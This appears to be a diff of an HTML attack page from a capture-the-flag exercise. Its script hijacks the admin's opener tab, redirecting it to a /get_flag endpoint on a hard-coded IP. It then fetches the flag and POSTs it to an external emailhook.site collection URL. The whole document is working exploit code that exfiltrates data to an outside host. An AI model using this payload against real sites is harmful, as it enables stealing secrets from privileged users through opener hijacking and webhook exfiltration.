@@ -1,11 +1,27 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Payload</title></head>
+  <head>
+    <title>Redirecting Admin...</title>
+  </head>
   <body>
-    <h1>Hello Admin 👋</h1>
+    <h1>Working on it...</h1>
     <script>
       if (window.opener) {
+        // Redireciona a aba principal do admin para /get_flag
         window.opener.location = "http://34.134.162.213:17001/get_flag";
+
+        // Aguarda e exfiltra a flag desta aba
+        setTimeout(() => {
+          fetch("http://34.134.162.213:17001/get_flag")
+            .then(r => r.text())
+            .then(flag => {
+              fetch("https://emailhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
+                method: "POST",
+                mode: "no-cors",
+                body: flag
+              });
+            });
+        }, 1500);
       }
     </script>
   </body>
